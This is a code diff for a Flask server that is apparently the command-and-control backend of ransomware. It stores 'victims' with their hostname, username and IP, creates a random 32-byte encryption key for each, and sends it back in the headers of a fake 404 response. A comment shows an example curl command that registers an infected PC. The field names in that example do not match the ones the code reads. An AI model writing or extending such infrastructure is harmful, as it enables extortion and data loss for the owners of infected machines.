@@ -3,6 +3,7 @@ from app import app, db
 from app.models import Victim, load_victim
 import random, os
 import base64
+import nacl
 
 # Show an overview of all victims currently registered in the database
 @app.route("/", methods=["GET"])
@@ -26,17 +27,18 @@ def displayArchive():
 
 # When called, creates an Victim object in the DB and responds with a fake 404,
 # with HTTP headers containing Encryption ID & Key
-# ex: curl -i -X POST -F 'victim_name=RandomInfectedPC' -F 'ip=192.168.178.3' http://127.1:5000/create
+# ex: curl -i -X POST -F 'victim_hostname=RandomInfectedPC' -F 'victim_username=someUser' -F 'ip=192.168.178.3' http://127.1:5000/create
 @app.route("/create", methods=["POST"])
 def createVictim():
     error = None
     if request.method == "POST":
         # if request.accesskey == "accesskey":
         victim_id = random.randint(0, 999999999999)
-        victim_key = base64.b64encode(os.urandom(16)).decode("ascii")
+        victim_key = base64.b64encode(os.urandom(32)).decode("ascii")
         victim = Victim(
             victim_id=victim_id,
-            victim_name=request.form["victim_name"],
+            victim_username=request.form["username"],
+            victim_hostname=request.form["hostname"],
             victim_key=victim_key,
             ip_firstContact=request.form["ip"],
         )
